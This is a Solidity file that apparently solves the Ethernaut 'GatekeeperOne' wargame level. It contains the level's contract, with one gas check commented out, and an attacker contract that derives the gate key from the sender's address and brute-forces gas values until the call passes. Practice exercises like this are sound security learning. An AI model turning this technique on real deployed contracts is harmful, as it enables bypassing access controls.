// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'https://raw.githubusercontent.com/OpenZeppelin/openzeppelin-contracts/release-v3.4/contracts/math/SafeMath.sol';

contract GatekeeperOne {
    event GasLeft(uint val);

    using SafeMath for uint256;
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin, "invalid sender origin");
        _;
    }

    modifier gateTwo() {
        emit GasLeft(gasleft());
        //require(gasleft().mod(8191) == 0, "invalid gasleft!");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperOneHack {
    event Done(uint gas);
    constructor(GatekeeperOne target) public {
        //non-zero 32 bits ... 16 zero bits ... 16 last bits of msg sender
        uint64 key = (uint64(type(uint32).max)<<32) + uint32(uint16(msg.sender));
        bool done;
        for (uint i = 0; i<200 && !done; i++) {
            uint g = 8191 + 150 + i;
            (bool success, ) = address(target)
            .call{gas:g}
            (abi.encodeWithSignature("enter(bytes8)", bytes8(key)));
            if (success) {
                emit Done(g);
                done = true;
            }
        }
        if (!done) {
            revert();
        }
    }
}